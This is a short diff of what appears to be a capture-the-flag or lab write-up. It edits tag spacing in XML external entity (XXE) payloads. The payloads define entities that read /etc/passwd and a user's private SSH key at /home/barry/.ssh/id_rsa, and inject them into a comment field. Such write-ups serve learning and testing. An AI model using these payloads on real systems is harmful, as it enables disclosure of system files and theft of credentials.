@@ -63,7 +63,7 @@ Lets go back and see what we missed...
 
 < ?xml version="1.0" encoding="UTF-8"?>
 
-<comment>
+< comment>
   <name>10DNC</name>
   <author>10DNC</author>
   <com>hacked</com>
@@ -80,9 +80,9 @@ Lets go back and see what we missed...
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
 < comment>
-  < name>10DNC</name>
-  < author>10DNC</author>
-  < com>&test;</com>
+  <name>10DNC</name>
+  <author>10DNC</author>
+  <com>&test;</com>
 </comment>
 
 <br>
@@ -90,7 +90,7 @@ Lets go back and see what we missed...
 
 < ?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///home/barry/.ssh/id_rsa'>]>
-<comment>
+< comment>
   <name>10DNC</name>
   <author>10DNC</author>
   <com>&test;</com>
